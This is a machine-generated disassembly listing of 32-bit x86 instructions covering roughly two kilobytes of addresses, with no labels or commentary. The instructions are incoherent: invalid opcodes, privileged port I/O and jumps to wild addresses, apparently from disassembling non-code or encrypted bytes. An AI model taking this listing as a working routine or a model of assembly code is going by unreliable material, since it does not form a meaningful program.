  4056be:	sub    eax,0xef513dae
  4056c3:	xchg   DWORD PTR [eax-0x6baae328],edi
  4056c9:	cmp    ch,BYTE PTR [esi-0x27e6dc1e]
  4056cf:	mov    esp,0x47295dd5
  4056d4:	pop    esi
  4056d5:	add    DWORD PTR [edx],esp
  4056d7:	bound  eax,QWORD PTR ds:0x66cc22b3
  4056dd:	dec    eax
  4056de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056df:	pop    ds
  4056e0:	mov    WORD PTR [ebx-0x3468787a],?
  4056e6:	xor    DWORD PTR [ebx+0x536cd841],ecx
  4056ec:	pushf  
  4056ed:	dec    edi
  4056ee:	ret    
  4056ef:	in     al,0x5b
  4056f1:	jmp    0xa9040317
  4056f6:	bound  ecx,QWORD PTR [esi-0x6655c398]
  4056fc:	pop    ecx
  4056fd:	fwait
  4056fe:	(bad)  
  4056ff:	mov    dh,0x8c
  405701:	pushf  
  405702:	inc    ecx
  405703:	hlt    
  405704:	adc    dh,BYTE PTR [edx+0x1b]
  405707:	mov    al,0xdd
  405709:	sbb    DWORD PTR [eax+ebx*4+0x5548c076],eax
  405710:	pop    ecx
  405711:	dec    esp
  405712:	mov    dl,0x4a
  405714:	(bad)  
  405715:	in     al,0x31
  405717:	int    0x5a
  405719:	jp     0x4056eb
  40571b:	push   eax
  40571c:	fisttp QWORD PTR [ebp*8+0x67271d9f]
  405723:	jg     0x405721
  405725:	rcl    BYTE PTR [esi+0x1308de43],0xdd
  40572c:	xchg   ecx,eax
  40572d:	(bad)  
  40572e:	stos   BYTE PTR es:[edi],al
  40572f:	scas   al,BYTE PTR es:[edi]
  405730:	loopne 0x405703
  405732:	push   edx
  405733:	dec    ecx
  405734:	cld    
  405735:	icebp  
  405736:	imul   ebx,DWORD PTR [ecx-0x60dab8eb],0x8b51ec2e
  405740:	dec    esp
  405741:	scas   eax,DWORD PTR es:[edi]
  405742:	fld    TBYTE PTR [ebx]
  405744:	mov    ds:0xf5940ec7,eax
  405749:	cmp    bh,al
  40574b:	mov    al,0xc
  40574d:	xchg   ebp,eax
  40574e:	inc    edi
  40574f:	mov    BYTE PTR [esi-0x67],ah
  405752:	(bad)  
  405754:	ror    bl,cl
  405756:	sbb    BYTE PTR [edi-0xc],cl
  405759:	retf   
  40575a:	push   edx
  40575b:	mov    esp,0xfef1ea3d
  405760:	out    0x54,al
  405762:	xchg   esi,eax
  405763:	jge    0x4056fe
  405765:	xchg   ebp,eax
  405766:	cdq    
  405767:	daa    
  405768:	ins    BYTE PTR es:[edi],dx
  405769:	outs   dx,DWORD PTR ds:[esi]
  40576a:	sub    eax,0x575b9353
  40576f:	inc    ecx
  405770:	loop   0x405711
  405772:	mov    dh,0xe8
  405774:	push   ebp
  405775:	(bad)  
  405776:	call   0x327d41b9
  40577b:	aad    0xc0
  40577d:	jmp    0x30e1:0xa0284207
  405784:	fnstcw WORD PTR ds:0xd8c65f2b
  40578a:	sub    al,0x1d
  40578c:	push   ebx
  40578d:	out    0x3a,al
  40578f:	aas    
  405790:	je     0x405763
  405792:	(bad)  
  405793:	jno    0x405782
  405795:	mov    dl,0x47
  405797:	push   cs
  405798:	repnz loopne 0x40572f
  40579b:	xor    ch,al
  40579d:	lock push ecx
  40579f:	js     0x40579a
  4057a1:	arpl   WORD PTR [esi-0x2b86d7b2],bp
  4057a7:	pop    edi
  4057a8:	fs inc ebx
  4057aa:	ret    
  4057ab:	mov    cl,0xe7
  4057ad:	jg     0x4057e7
  4057af:	stos   BYTE PTR es:[edi],al
  4057b0:	ds jb  0x405829
  4057b3:	in     eax,0x40
  4057b5:	ds jecxz 0x405780
  4057b8:	or     bh,BYTE PTR [esi+0x74]
  4057bb:	mov    ebx,0xa5871a07
  4057c0:	(bad)  
  4057c1:	rcr    DWORD PTR [esi+0x7682fc17],1
  4057c7:	push   es
  4057c8:	es enter 0x824c,0x45
  4057cd:	jecxz  0x4057f0
  4057cf:	add    BYTE PTR [ecx+0x1b],dl
  4057d2:	jmp    0x40582e
  4057d4:	mov    edx,0xbdb1adba
  4057d9:	(bad)  
  4057da:	jge    0x4057dc
  4057dc:	jno    0x405839
  4057de:	fwait
  4057df:	cdq    
  4057e0:	cmp    eax,0x5c4ab441
  4057e5:	xor    al,0x95
  4057e7:	jecxz  0x40576a
  4057e9:	add    DWORD PTR [eax-0x4b],edx
  4057ec:	fdivr  st,st(3)
  4057ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057ef:	sbb    esp,ebx
  4057f1:	mov    eax,ds:0xd3b71ce3
  4057f6:	std    
  4057f7:	test   BYTE PTR [ebx+eax*8],ah
  4057fa:	repnz lods eax,DWORD PTR ds:[esi]
  4057fc:	rol    DWORD PTR [ecx],cl
  4057fe:	jbe    0x4057f7
  405800:	add    edx,edx
  405802:	ja     0x405804
  405804:	stc    
  405805:	test   DWORD PTR ds:0x60e11cb,edi
  40580b:	add    eax,0x58d87579
  405810:	lods   eax,DWORD PTR ds:[si]
  405812:	jno    0x40579c
  405814:	and    al,0xb6
  405816:	gs retf 0x7d0a
  40581a:	out    dx,al
  40581b:	inc    edi
  40581c:	ss scas al,BYTE PTR es:[edi]
  40581e:	hlt    
  40581f:	mov    al,0x9d
  405821:	imul   ecx,DWORD PTR [ecx-0x6b],0x5b
  405825:	leave  
  405826:	mov    ds:0x90318cc2,al
  40582b:	ins    BYTE PTR es:[edi],dx
  40582c:	push   0x52
  40582e:	adc    eax,0xa96eab7d
  405833:	jmp    0x9e7da676
  405838:	iret   
  405839:	xchg   ebp,eax
  40583a:	push   ecx
  40583b:	push   ss
  40583c:	out    dx,al
  40583d:	dec    edx
  40583e:	popa   
  40583f:	inc    ebp
  405840:	jge    0x40586d
  405842:	mov    edx,0xa414b081
  405847:	push   0x8234ffac
  40584c:	dec    esp
  40584d:	add    al,0x8e
  40584f:	push   ebp
  405850:	mov    esp,0x12781c6f
  405855:	cli    
  405856:	(bad)  
  405857:	fdivr  DWORD PTR [edx-0x3b08d77a]
  40585d:	stc    
  40585e:	bound  esp,QWORD PTR [edi+0x7]
  405861:	fwait
  405862:	js     0x40582a
  405864:	jae    0x405830
  405866:	call   0x8c5c:0x74cf6eaf
  40586d:	repnz mov ?,WORD PTR [edi+edx*2+0x5c23f0fb]
  405875:	es stos WORD PTR es:[edi],ax
  405878:	xchg   ebp,eax
  405879:	xchg   ecx,eax
  40587a:	push   ds
  40587b:	or     DWORD PTR [ecx+edx*4+0x50a6e79e],0x83335084
  405886:	shl    DWORD PTR ds:0xab45c3c8,1
  40588c:	push   es
  40588d:	in     al,0xc2
  40588f:	pusha  
  405890:	xchg   BYTE PTR [edx],dl
  405892:	or     edx,edx
  405894:	dec    eax
  405895:	out    0xf5,eax
  405897:	imul   esp,DWORD PTR [esi],0xe51eef27
  40589d:	and    cl,BYTE PTR [eax+0x58b6d39e]
  4058a3:	mov    ch,0xe
  4058a5:	imul   edi,DWORD PTR [ecx+0x8],0xf27811ed
  4058ac:	je     0x4058a0
  4058ae:	aam    0xe8
  4058b0:	mov    esp,0x741c0e48
  4058b5:	rcr    ch,0x3f
  4058b8:	int    0xef
  4058ba:	bnd jb 0x405904
  4058bd:	push   eax
  4058be:	push   0xffffffea
  4058c0:	loopne 0x405939
  4058c2:	add    edx,DWORD PTR [edi-0x34]
  4058c5:	std    
  4058c6:	mov    bh,0x62
  4058c8:	pop    ss
  4058c9:	out    0xe8,eax
  4058cb:	iret   
  4058cc:	push   edi
  4058cd:	cs xchg bx,ax
  4058d0:	scas   eax,DWORD PTR es:[edi]
  4058d1:	push   0x31da7ac0
  4058d6:	inc    eax
  4058d7:	dec    edx
  4058d8:	rol    eax,0xad
  4058db:	mov    ebp,0x2b94163f
  4058e0:	sbb    DWORD PTR [edi+0x2c473f0c],esp
  4058e6:	repnz out dx,al
  4058e8:	xor    DWORD PTR [edi+edx*2],edx
  4058eb:	push   ss
  4058ec:	inc    BYTE PTR [ecx]
  4058ee:	jb     0x4058a0
  4058f0:	add    eax,0xb36595bc
  4058f5:	jmp    0xbf5b:0xa491457b
  4058fc:	retf   0x4a8f
  4058ff:	clc    
  405900:	pop    eax
  405901:	out    0xbb,eax
  405903:	mov    ds:0x9a68593,al
  405908:	sar    BYTE PTR [esi-0x3],cl
  40590b:	jmp    0xd942:0xba2fb128
  405912:	inc    esi
  405913:	into   
  405914:	dec    eax
  405915:	jp     0x4058a1
  405917:	push   DWORD PTR cs:[edx]
  40591a:	out    0x2e,eax
  40591c:	test   BYTE PTR [esi-0xa],bh
  40591f:	and    dl,BYTE PTR [edi]
  405921:	xchg   esi,eax
  405922:	push   esp
  405923:	popf   
  405924:	or     al,0x8e
  405926:	add    al,0x6c
  405928:	pop    es
  405929:	dec    ebx
  40592a:	test   al,0xf5
  40592c:	popf   
  40592d:	fdivr  DWORD PTR [edi-0x1c]
  405930:	inc    esi
  405931:	(bad)  
  405932:	or     eax,0x6d58c3d
  405937:	stc    
  405938:	adc    al,0xff
  40593a:	sbb    eax,0x9c92c169
  40593f:	cmc    
  405940:	clc    
  405941:	jp     0x40599c
  405943:	in     al,dx
  405944:	and    ebx,ecx
  405946:	fwait
  405947:	sub    edx,DWORD PTR [eax-0x37]
  40594a:	xchg   DWORD PTR [ebp-0x41],edx
  40594d:	shl    DWORD PTR [ebp+0x1eddee67],1
  405953:	dec    ecx
  405954:	mov    DWORD PTR [ecx-0x6f],eax
  405957:	cmp    al,0x4f
  405959:	mov    al,ds:0x7eb30955
  40595e:	xlat   BYTE PTR ds:[ebx]
  40595f:	int3   
  405960:	push   ebx
  405961:	sbb    al,0xeb
  405963:	rcl    BYTE PTR [ebp+0x1c4b1352],0x32
  40596a:	pop    ebp
  40596b:	test   DWORD PTR [ecx+0x2f681d48],ebp
  405971:	mov    dl,0xc
  405973:	test   eax,0x4185e6ad
  405978:	lahf   
  405979:	sub    BYTE PTR [edx+0x73],ah
  40597c:	push   es
  40597d:	mov    bl,0xaa
  40597f:	xor    DWORD PTR [edi+0x6b],ecx
  405982:	push   esi
  405983:	push   ecx
  405984:	adc    ebp,esp
  405986:	xor    al,bh
  405988:	mov    ch,0xa7
  40598a:	pop    es
  40598b:	jmp    0xa0966c9c
  405990:	mov    ah,0x21
  405992:	pop    ebp
  405993:	dec    ebp
  405994:	and    DWORD PTR [esp+edx*8+0x3be5005b],esi
  40599b:	clc    
  40599c:	retf   
  40599d:	hlt    
  40599e:	xor    DWORD PTR [eax+0x2632cf41],esi
  4059a4:	rcl    ch,cl
  4059a6:	cs cli 
  4059a8:	arpl   WORD PTR [edx],di
  4059aa:	and    al,0xe2
  4059ac:	stos   BYTE PTR es:[edi],al
  4059ad:	push   0x5a
  4059af:	test   DWORD PTR [ebp-0x71daf48d],ecx
  4059b5:	xchg   esp,eax
  4059b6:	jno    0x405985
  4059b8:	add    al,0xc1
  4059ba:	inc    ebp
  4059bb:	fbstp  TBYTE PTR [ebx+0x2d]
  4059be:	lds    edi,FWORD PTR [ecx-0x3427779f]
  4059c4:	rcl    BYTE PTR [edx],0xb1
  4059c7:	mov    dh,0x46
  4059c9:	aad    0x59
  4059cb:	xchg   esp,eax
  4059cc:	xchg   edx,eax
  4059cd:	inc    ebp
  4059ce:	imul   ebp,DWORD PTR [edx],0x7f
  4059d1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4059d3:	test   al,0xe1
  4059d5:	stc    
  4059d6:	in     eax,dx
  4059d7:	sar    BYTE PTR [edx],0x2c
  4059da:	in     eax,dx
  4059db:	test   al,0xe7
  4059dd:	sahf   
  4059de:	push   esp
  4059df:	xor    DWORD PTR [ebp-0x3a],ebp
  4059e2:	cmp    al,0xd
  4059e4:	cmp    eax,0x5235dd79
  4059e9:	cld    
  4059ea:	outs   dx,BYTE PTR ds:[esi]
  4059eb:	add    eax,edi
  4059ed:	leave  
  4059ee:	stos   BYTE PTR es:[edi],al
  4059ef:	stos   DWORD PTR es:[edi],eax
  4059f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059f1:	pop    ebx
  4059f2:	fcmovb st,st(4)
  4059f4:	jmp    0xb240:0x62072595
  4059fb:	jmp    0x746d:0x4272a958
  405a02:	adc    al,dl
  405a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a05:	loope  0x405a2b
  405a07:	dec    eax
  405a08:	mov    bl,BYTE PTR [ebx]
  405a0a:	push   eax
  405a0b:	hlt    
  405a0c:	xor    BYTE PTR [edx-0x7e],bl
  405a0f:	jno    0x4059fb
  405a11:	ret    
  405a12:	xor    ah,cl
  405a14:	in     eax,dx
  405a15:	jg     0x4059b6
  405a17:	cmp    edx,DWORD PTR [ecx-0x4c89c702]
  405a1d:	out    dx,eax
  405a1e:	push   esi
  405a1f:	fcmovbe st,st(1)
  405a21:	scas   al,BYTE PTR es:[edi]
  405a22:	dec    BYTE PTR [esi-0x26]
  405a25:	cwde   
  405a26:	mov    ebp,0xd535ae96
  405a2b:	push   edx
  405a2c:	popf   
  405a2d:	bound  edx,QWORD PTR [ebx-0x74ed9bec]
  405a33:	dec    esi
  405a34:	push   edx
  405a35:	inc    edi
  405a36:	iret   
  405a37:	in     al,0xb
  405a39:	cs ret 0x3839
  405a3d:	adc    eax,0x8da5df45
  405a42:	xchg   edi,eax
  405a43:	test   al,0x5f
  405a45:	xor    ah,ch
  405a47:	xchg   edi,eax
  405a48:	out    dx,al
  405a49:	mov    esp,0x7c4af63f
  405a4e:	pop    ecx
  405a4f:	mov    ds:0x16aea8b4,al
  405a54:	in     al,0x93
  405a56:	call   0x7a16ef4c
  405a5b:	adc    ecx,0x1a2f29fb
  405a61:	imul   ecx,ebp,0x21
  405a64:	into   
  405a65:	sbb    DWORD PTR [edi+0x69fd1276],ebp
  405a6b:	adc    BYTE PTR [edx],dl
  405a6d:	std    
  405a6e:	(bad)  
  405a6f:	out    0x38,al
  405a71:	into   
  405a72:	inc    ebp
  405a73:	enter  0xf4cb,0x80
  405a77:	add    dl,BYTE PTR [edx]
  405a79:	cmp    dl,BYTE PTR [ebp+edx*8+0x58]
  405a7d:	les    ebx,FWORD PTR [eax-0x204b473c]
  405a83:	mov    DWORD PTR [eax+0x477de001],edx
  405a89:	daa    
  405a8a:	scas   eax,DWORD PTR es:[edi]
  405a8b:	xor    BYTE PTR [ecx+0x2c947ff7],al
  405a91:	xchg   esi,eax
  405a92:	and    al,0x89
  405a94:	fsub   DWORD PTR [edx-0xf]
  405a97:	mov    al,BYTE PTR [edi]
  405a99:	cwde   
  405a9a:	sub    BYTE PTR [esi],dl
  405a9c:	int3   
  405a9d:	mov    esi,0x9863c99b
  405aa2:	jecxz  0x405a61
  405aa4:	imul   edx,ecx,0x33
  405aa7:	ins    DWORD PTR es:[edi],dx
  405aa8:	jmp    0x97d3:0x301fe017
  405aaf:	hlt    
  405ab0:	push   esp
  405ab1:	arpl   sp,dx
  405ab3:	sub    ebp,0xffffff88
  405ab6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ab7:	in     eax,0xd6
  405ab9:	sahf   
  405aba:	fldenv [edi-0x2e]
  405abd:	fyl2x  
  405abf:	sahf   
  405ac0:	adc    dl,0xb5
  405ac3:	(bad)  
  405ac4:	js     0x405aa0
  405ac6:	xor    DWORD PTR [edi-0x55380228],0xdce6de4a
  405ad0:	in     eax,dx
  405ad1:	inc    ebp
  405ad2:	adc    esp,DWORD PTR [eax+0x27b7729a]
  405ad8:	mov    dl,0xa1
  405ada:	adc    al,0xc3
  405adc:	loope  0x405b27
  405ade:	inc    ebx
  405adf:	mov    bl,0x2d
  405ae1:	cli    
  405ae2:	mov    al,ds:0x9a20d043
  405ae7:	sar    BYTE PTR [edx+esi*4],1
  405aea:	pop    edi
  405aeb:	push   ebx
  405aec:	add    DWORD PTR [eax-0x6bb90695],edi
  405af2:	sub    BYTE PTR [esi+0x66],0xcc
  405af6:	(bad)  
  405af7:	rol    BYTE PTR [eax-0x3b],0x5b
  405afb:	inc    eax
  405afc:	int3   
  405afd:	pusha  
  405afe:	xor    edx,ebp
  405b00:	mov    bh,0xf2
  405b02:	outs   dx,DWORD PTR ds:[esi]
  405b03:	adc    ecx,eax
  405b05:	mov    ds:0xaaa6381,al
  405b0a:	fld    TBYTE PTR [edi]
  405b0c:	js     0x405b74
  405b0e:	nop
  405b0f:	cmp    ch,BYTE PTR [edi+0x1c]
  405b12:	inc    ebx
  405b13:	cmp    BYTE PTR [ecx-0x59315439],al
  405b19:	push   0x18
  405b1b:	jle    0x405acb
  405b1d:	inc    edx
  405b1e:	(bad)  
  405b1f:	mov    edi,0x95e1c1ea
  405b24:	call   0xd7cb:0x150c9e32
  405b2b:	cmp    DWORD PTR [ebx-0x2c],0xffffffbe
  405b2f:	xor    ah,bl
  405b31:	test   al,0x6c
  405b33:	test   eax,0xffc92496
  405b38:	scas   eax,DWORD PTR es:[edi]
  405b39:	nop
  405b3a:	hlt    
  405b3b:	inc    ebp
  405b3c:	add    DWORD PTR [ecx-0x253a13f],0x3e
  405b43:	mov    ds:0x6b36a452,al
  405b48:	aaa    
  405b49:	popf   
  405b4a:	jae    0x405bcb
  405b4c:	xchg   edx,eax
  405b4d:	mov    ah,0x10
  405b4f:	mov    dh,0x94
  405b51:	retf   
  405b52:	imul   edi,DWORD PTR [edx],0x33
  405b55:	adc    al,0x48
  405b57:	xchg   BYTE PTR [ecx],bl
  405b59:	xchg   ebx,eax
  405b5a:	ins    DWORD PTR es:[edi],dx
  405b5b:	scas   eax,DWORD PTR es:[edi]
  405b5c:	xor    BYTE PTR [edx],0x51
  405b5f:	fcomp  QWORD PTR ds:0xca34e8b9
  405b65:	cmp    ah,cl
  405b67:	shl    DWORD PTR [edi-0x1f],0x45
  405b6b:	add    al,BYTE PTR [edi-0x65b6f2ba]
  405b71:	mov    esp,0x35dfcff6
  405b76:	jp     0x405b01
  405b78:	arpl   WORD PTR [ecx-0x21],ax
  405b7b:	xchg   edx,eax
  405b7c:	mov    al,0x6c
  405b7e:	jl     0x405b14
  405b80:	sbb    al,BYTE PTR [edi-0xd4a5d14]
  405b86:	pop    edx
  405b87:	fnstcw WORD PTR [edx]
  405b89:	cli    
  405b8a:	rcr    DWORD PTR [edx],cl
  405b8c:	in     eax,0xac
  405b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b8f:	adc    DWORD PTR [ebx+0x279e6b49],edx
  405b95:	es int3 
  405b97:	out    dx,eax
  405b98:	and    bh,BYTE PTR [eax+0x55]
  405b9b:	pop    ecx
  405b9c:	clc    
  405b9d:	adc    dl,0xbe
  405ba0:	ja     0x405b66
  405ba2:	push   ecx
  405ba3:	mov    ah,0xec
  405ba5:	into   
  405ba6:	xchg   esp,eax
  405ba7:	out    0x1b,al
  405ba9:	pop    ds
  405baa:	xchg   esi,eax
  405bab:	out    dx,eax
  405bac:	cmp    al,0xc6
  405bae:	jnp    0x405b6b
  405bb0:	mov    cs,WORD PTR gs:[edx+0x5d5344c3]
  405bb7:	rcr    bl,cl
  405bb9:	pushf  
  405bba:	imul   ecx,esi,0x8
  405bbd:	dec    ebx
  405bbe:	(bad)  
  405bbf:	jmp    0xe4c6:0x2c4bc5f8
  405bc6:	xor    eax,0x19c2e672
  405bcb:	mov    WORD PTR ds:0x85f37ac2,es
  405bd1:	sahf   
  405bd2:	xchg   edx,eax
  405bd3:	xchg   edx,eax
  405bd4:	scas   eax,DWORD PTR es:[edi]
  405bd5:	popa   
  405bd6:	mov    esi,0x33264632
  405bdb:	mov    bl,BYTE PTR [ebp-0x7c]
  405bde:	pop    edx
  405bdf:	dec    esp
  405be0:	call   0x53e8a597
  405be5:	mov    eax,ds:0xf0f2f4d2
  405bea:	les    edi,FWORD PTR [esi]
  405bec:	fld    DWORD PTR [eax-0x52]
  405bef:	inc    esp
  405bf0:	out    dx,al
  405bf1:	fsubr  QWORD PTR [eax+0x7f5ba428]
  405bf7:	scas   al,BYTE PTR es:[edi]
  405bf8:	adc    ch,BYTE PTR [edx+edx*2]
  405bfb:	push   esi
  405bfc:	in     al,0x55
  405bfe:	ss mov al,0x9b
  405c01:	lods   eax,DWORD PTR ds:[esi]
  405c02:	cmp    ecx,edx
  405c04:	and    esi,0xffffff87
  405c07:	lea    edx,[esi+0x14a22243]
  405c0d:	xchg   edi,eax
  405c0e:	iret   
  405c0f:	in     eax,dx
  405c10:	mov    esi,0x1c94c16e
  405c15:	js     0x405c7f
  405c17:	pop    ecx
  405c18:	rcr    DWORD PTR [ecx],0xa
  405c1b:	or     eax,0x3098a78
  405c20:	sub    DWORD PTR [esi+0x26],0xffffffbe
  405c24:	(bad)  
  405c25:	pushf  
  405c26:	or     BYTE PTR [edx+0x28c8d18d],0x62
  405c2d:	jg     0x405c9b
  405c2f:	clc    
  405c30:	xor    BYTE PTR [edx+eax*8+0x30940a40],bh
  405c37:	fcom   DWORD PTR [ecx]
  405c39:	cmp    BYTE PTR [eax-0x30233b4b],cl
  405c3f:	jmp    0x8a3e264
  405c44:	xchg   DWORD PTR [ebp-0x3daad314],eax
  405c4a:	les    esi,FWORD PTR [esi+esi*8+0xb743b6e]
  405c51:	iret   
  405c52:	data16 cmp cl,bh
  405c55:	pop    edi
  405c56:	mov    dh,0x8a
  405c58:	add    al,0x6b
  405c5a:	std    
  405c5b:	sub    BYTE PTR [ebp+0x10],bl
  405c5e:	test   BYTE PTR [eax],ah
  405c60:	xchg   BYTE PTR [edi],bh
  405c62:	push   esp
  405c63:	inc    ecx
  405c64:	mov    ds:0x21e74ea,eax
  405c69:	inc    esi
  405c6a:	call   0xffda6a01
  405c6f:	or     DWORD PTR [ebx+0x76b05bf1],ebp
  405c75:	jl     0x405c7f
  405c77:	mov    ds:0x29b18cb3,al
  405c7c:	lods   al,BYTE PTR ds:[esi]
  405c7d:	xor    ecx,DWORD PTR [ebx-0x7113ed5b]
  405c83:	ins    BYTE PTR es:[edi],dx
  405c84:	push   0x3e
  405c86:	push   esp
  405c87:	mov    dl,0xfa
  405c89:	hlt    
  405c8a:	clc    
  405c8b:	(bad)
  405c8e:	jl     0x405c2b
  405c90:	cmp    eax,0x6345c35a
  405c95:	jmp    0x2c41a4a0
  405c9a:	test   BYTE PTR [eax],0x72
  405c9d:	jle    0x405c7f
  405c9f:	push   edi
  405ca0:	pop    ebp
  405ca1:	lods   eax,DWORD PTR ds:[esi]
  405ca2:	push   ecx
  405ca3:	in     al,dx
  405ca4:	pop    ds
  405ca5:	fimul  DWORD PTR [esi+0xe]
  405ca8:	sub    DWORD PTR [eax],ebx
  405caa:	jmp    0xbdb1b195
  405caf:	push   ss
  405cb0:	adc    bh,al
  405cb2:	cmp    al,0x8b
  405cb4:	nop
  405cb5:	and    DWORD PTR [edi+0x16],esi
  405cb8:	and    eax,0xd227b07
  405cbd:	pop    ss
  405cbe:	ret    0x1d98
  405cc1:	(bad)  
  405cc2:	jp     0x405d34
  405cc4:	mov    BYTE PTR [eax],bl
  405cc6:	jno    0x405c84
  405cc8:	mov    ebx,DWORD PTR [edi-0x502260eb]
  405cce:	ja     0x405d25
  405cd0:	mov    edi,0xace05754
  405cd5:	enter  0xf784,0x16
  405cd9:	sbb    BYTE PTR [ebp+0x7a],ah
  405cdc:	rcl    BYTE PTR [esi],1
  405cde:	push   ebx
  405cdf:	inc    ecx
  405ce0:	add    DWORD PTR [ecx],eax
  405ce2:	mov    ecx,0xb225854f
  405ce7:	aaa    
  405ce8:	push   ebx
  405ce9:	addr16 push ebp
  405ceb:	push   edi
  405cec:	(bad)  
  405ced:	pop    edi
  405cee:	xor    BYTE PTR [ebx],bl
  405cf0:	mov    ds:0xd0019b4e,al
  405cf5:	leave  
  405cf6:	adc    esi,ebp
  405cf8:	xchg   DWORD PTR [ebx+0x233ad53a],ecx
  405cfe:	or     eax,0x3fb7d0ea
  405d03:	in     al,dx
  405d04:	push   ebp
  405d05:	push   ss
  405d06:	cld    
  405d07:	lahf   
  405d08:	imul   edx,ebx,0x64
  405d0b:	das    
  405d0c:	or     DWORD PTR [ebx-0x44fba898],edx
  405d12:	std    
  405d13:	push   esi
  405d14:	pusha  
  405d15:	ret    
  405d16:	dec    edx
  405d17:	les    ecx,FWORD PTR [eax]
  405d19:	mov    cl,0x35
  405d1b:	inc    edx
  405d1c:	imul   ecx,edx,0x36
  405d1f:	nop
  405d20:	lds    ecx,FWORD PTR [edx+0x123e98a4]
  405d26:	je     0x405d46
  405d28:	repnz push ecx
  405d2a:	pop    ecx
  405d2b:	push   es
  405d2c:	sbb    ebp,edi
  405d2e:	jne    0x405d4d
  405d30:	(bad)  
  405d31:	xor    bl,BYTE PTR [esi-0xaccb3ce]
  405d37:	fxch   st(7)
  405d39:	cwde   
  405d3a:	test   DWORD PTR [edi+eiz*4],ecx
  405d3d:	dec    ebp
  405d3e:	jge    0x405d64
  405d40:	ins    DWORD PTR es:[edi],dx
  405d41:	push   ss
  405d42:	mov    ds:0xef31fcb2,eax
  405d47:	jbe    0x405cf2
  405d49:	push   ebx
  405d4a:	dec    ebp
  405d4b:	dec    esp
  405d4c:	push   edx
  405d4d:	fistp  WORD PTR [edi-0x53]
  405d50:	xor    eax,DWORD PTR [ecx+ebx*4]
  405d53:	mov    ds,WORD PTR [esi-0x71]
  405d56:	jecxz  0x405dbd
  405d58:	xor    eax,0x7af2cfaa
  405d5d:	call   0x35c3:0x8b981a3c
  405d64:	int3   
  405d65:	xchg   DWORD PTR [edx+0x2a],ebp
  405d68:	mov    ebx,0xb42e7750
  405d6d:	xchg   ebp,eax
  405d6e:	push   eax
  405d6f:	xchg   edx,eax
  405d70:	xor    DWORD PTR [edx],edi
  405d72:	mov    al,0x6d
  405d74:	ret    
  405d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d76:	repnz das 
  405d78:	in     eax,0x6a
  405d7a:	stos   DWORD PTR es:[edi],eax
  405d7b:	pop    ss
  405d7c:	clc    
  405d7d:	(bad)  
  405d7e:	in     al,dx
  405d7f:	cmp    al,0xa7
  405d81:	out    0x24,al
  405d83:	xchg   bl,bh
  405d85:	jg     0x405d5b
  405d87:	arpl   WORD PTR [esi-0x57647bd4],ax
  405d8d:	xor    ecx,ebp
  405d8f:	push   ecx
  405d90:	mul    DWORD PTR [esi]
  405d92:	and    eax,0xa006a2b6
  405d97:	mov    dh,0xbf
  405d99:	jbe    0x405d63
  405d9b:	fiadd  DWORD PTR [eax-0x56ea8065]
  405da1:	jo     0x405de9
  405da3:	xor    BYTE PTR [edi],dh
  405da5:	shl    DWORD PTR [ecx+0x885870c],1
  405dab:	scas   eax,DWORD PTR es:[edi]
  405dac:	shl    BYTE PTR [esi-0x80],cl
  405daf:	mov    ebp,0x68d04cc8
  405db4:	dec    edi
  405db5:	jmp    0xb734:0xab9641c6
  405dbc:	inc    edi
  405dbd:	push   es
  405dbe:	mov    WORD PTR [eax],ds
  405dc0:	dec    esi
  405dc1:	and    al,0xd
  405dc3:	pop    edi
  405dc4:	mov    ah,0x89
  405dc7:	add    ebx,DWORD PTR [edx+0x19]
  405dca:	nop
  405dcb:	mov    edx,0x87dd71eb
  405dd0:	xchg   BYTE PTR [bp+si],dh
  405dd3:	int3   
  405dd4:	mov    eax,esi
  405dd6:	sub    ebp,ebx
  405dd8:	test   eax,0x52f3b5a1
  405ddd:	add    DWORD PTR [edx-0x54cf8571],0xdd55c299
  405de7:	(bad)  
  405de8:	fisttp QWORD PTR [ecx+ecx*4-0x7a7797fd]
  405def:	fld    TBYTE PTR [ecx+ebp*1+0x69]
  405df3:	ins    DWORD PTR es:[edi],dx
  405df4:	xchg   ecx,eax
  405df5:	imul   eax,DWORD PTR [esi-0x2c19cd7c],0x4d
  405dfc:	jecxz  0x405dde
  405dfe:	ret    0xd628
  405e01:	xor    BYTE PTR [ecx+ecx*1-0x2319815b],bh
  405e08:	dec    ecx
  405e09:	jl     0xddfc6230
  405e0f:	jge    0x405de1
  405e11:	pop    es
  405e12:	push   0xccb0efdf
  405e17:	jne    0x405dfe
  405e19:	add    eax,DWORD PTR [edx+0x5a]
  405e1c:	fadd   DWORD PTR [ecx-0x1b]
  405e1f:	xchg   esi,eax
  405e20:	pop    esi
  405e21:	sbb    BYTE PTR [ebx-0x34],al
  405e24:	adc    eax,0xbb68cdf2
  405e29:	and    al,0xa2
  405e2b:	xor    DWORD PTR ds:0x10aecca6,0x7a
  405e32:	mov    ebp,0xc5662049
  405e37:	jmp    0xe333:0xe958401a
  405e3e:	add    eax,0x4510ded1
  405e43:	nop
  405e44:	rol    ah,1
  405e46:	aaa    
  405e47:	adc    ebp,DWORD PTR [edi]
  405e49:	stc    
  405e4a:	cmp    esi,DWORD PTR [edi+0x61]
  405e4d:	add    eax,0x6d4cbd88
  405e52:	nop    DWORD PTR [esi]
  405e55:	add    eax,0xf37e368d
  405e5a:	mov    ebp,0x64a5e477
  405e5f:	bound  esi,QWORD PTR [ebp+0x62]
  405e62:	jmp    ebx
  405e64:	clc    
  405e65:	mov    WORD PTR [edi+0x5a16936a],ds
  405e6b:	mul    DWORD PTR [eax-0x3b14bbb5]
  405e71:	sub    DWORD PTR [esi-0x15e01a84],esi
  405e77:	cmp    ch,dl
  405e79:	mov    cl,0xb5
  405e7b:	loope  0x405e02
  405e7d:	pop    edi
  405e7e:	pcmpeqd mm7,QWORD PTR [esi-0x39]
  405e82:	push   es
  405e83:	pop    es
  405e84:	sub    eax,0x4d9255d8
  405e89:	js     0x405e0d
  405e8b:	in     al,dx
  405e8c:	xor    DWORD PTR [ecx+eiz*2],eax
  405e8f:	arpl   WORD PTR [edx+eax*1+0x16],dx
  405e93:	mov    dl,0x43
  405e95:	xchg   ebp,eax
  405e96:	push   ebx
  405e97:	mov    edx,0x9e9ae384
